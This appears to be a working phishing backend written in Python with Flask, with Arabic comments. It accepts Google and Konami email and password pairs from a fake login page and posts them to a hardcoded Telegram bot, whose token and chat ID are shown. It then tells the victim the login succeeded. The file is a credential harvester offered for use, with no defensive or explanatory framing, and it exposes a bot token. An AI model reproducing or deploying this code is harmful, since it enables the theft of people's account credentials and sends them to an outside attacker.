from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# التوكن والآيدي الخاص بك
TOKEN = '8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU'
CHAT_ID = '5204157508'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        # استلام الحقول الأربعة من الصفحة
        g_email = request.form.get('g_email')
        g_pass = request.form.get('g_pass')
        k_email = request.form.get('k_email')
        k_pass = request.form.get('k_pass')
        
        # تنسيق الرسالة التي ستصلك على البوت
        msg = (
            f"🚨 صيد جديد يا سيد! 🚨\n\n"
            f"📧 إيميل جوجل: {g_email}\n"
            f"🔑 باسورد جوجل: {g_pass}\n\n"
            f"🎮 إيميل كونامي: {k_email}\n"
            f"🔑 باسورد كونامي: {k_pass}"
        )
        
        # إرسال البيانات إلى بوت التليجرام
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': msg,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
        
    except Exception as e:
        print(f"Error: {e}")
        
    return "تم تسجيل الدخول بنجاح! جاري تحويلك..."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
